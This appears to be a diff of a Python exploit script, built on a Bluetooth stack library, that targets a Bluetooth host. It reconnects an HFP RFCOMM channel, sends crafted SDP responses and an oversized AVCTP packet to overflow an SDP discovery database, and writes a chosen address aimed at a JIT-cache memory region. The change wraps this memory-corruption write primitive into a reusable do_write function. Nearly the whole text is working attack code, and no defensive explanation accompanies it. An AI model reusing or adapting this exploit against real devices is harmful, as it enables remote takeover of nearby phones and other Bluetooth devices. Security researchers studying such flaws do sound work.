@@ -110,41 +110,48 @@ async def main():
         rfcomm_client = rfcomm.Client(connection)
         rfcomm_mux = await rfcomm_client.start()
 
-        channel = await rfcomm_mux.open_dlc(hfp_channel_id)
-        print("open dlc!!!!!!!")
-        await asyncio.sleep(0.5)
-        await channel.disconnect()
-        await asyncio.sleep(0.5)
-        channel = await rfcomm_mux.open_dlc(hfp_channel_id)
-        await asyncio.sleep(0.5)
-        device.sdp_server.send_response(
-            sdp.SDP_ErrorResponse(
-                transaction_id=requests[0].transaction_id,
-                error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
-            ))
-        await asyncio.sleep(0.5)
-        # with 0xef as my filler:
-        # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
-        # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
-        buf_offset = 0x13
-        tSDP_DISCOVERY_DB_raw_data_offset = 0x70
-        # raw_data, raw_size, raw_used
+        async def do_write(target_address, target_buffer):
+            requests.clear()
+            channel = await rfcomm_mux.open_dlc(hfp_channel_id)
+            print("open dlc!!!!!!!")
+            await asyncio.sleep(0.5)
+            await channel.disconnect()
+            await asyncio.sleep(0.5)
+            channel = await rfcomm_mux.open_dlc(hfp_channel_id)
+            await asyncio.sleep(0.5)
+            device.sdp_server.send_response(
+                sdp.SDP_ErrorResponse(
+                    transaction_id=requests[0].transaction_id,
+                    error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
+                ))
+            await asyncio.sleep(0.5)
+            # with 0xef as my filler:
+            # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
+            # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
+            buf_offset = 0x13
+            tSDP_DISCOVERY_DB_raw_data_offset = 0x70
+            # raw_data, raw_size, raw_used
+            avrcp_command_buf = b"A" * (
+                tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
+                    "<QII", target_address, 0x41414141, 0x0) + b"\xef" * 0x80
+            avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
+                AvctMakePacket(0, avrcp.Protocol.PacketType.START, False,
+                               False, 0x4141, avrcp_command_buf))
+            sdp_attribute_list = bytes(sdp.DataElement.sequence([b"A" * 0x100
+                                                                 ]))
+            device.sdp_server.send_response(
+                sdp.SDP_ServiceSearchAttributeResponse(
+                    transaction_id=requests[1].transaction_id,
+                    attribute_lists_byte_count=len(sdp_attribute_list),
+                    attribute_lists=sdp_attribute_list,
+                    continuation_state=bytes([0])))
+            await asyncio.sleep(0.5)
+            avrcp_protocol.avctp_protocol.send_response(0, 0x4141, b"A")
+            await channel.disconnect()
+            await asyncio.sleep(0.5)
+
         # 76ccc61000-76d0c61000 rw-s 00000000 00:01 5731                           /memfd:jit-cache (deleted)
-        target_address = 0x7265f47000 + 0x2000000 + 0x2000
-        avrcp_command_buf = b"A" * (
-            tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
-                "<QII", target_address, 0x41414141, 0x0) + b"\xef" * 0x80
-        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
-            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
-                           0x4141, avrcp_command_buf))
-        sdp_attribute_list = bytes(sdp.DataElement.sequence([b"A" * 0x100]))
-        device.sdp_server.send_response(
-            sdp.SDP_ServiceSearchAttributeResponse(
-                transaction_id=requests[1].transaction_id,
-                attribute_lists_byte_count=len(sdp_attribute_list),
-                attribute_lists=sdp_attribute_list,
-                continuation_state=bytes([0])))
-        await asyncio.sleep(4)
+        await do_write(0x7265f47000 + 0x2000000 + 0x2000, b"A" * 0x800)
 
 
 asyncio.run(main())
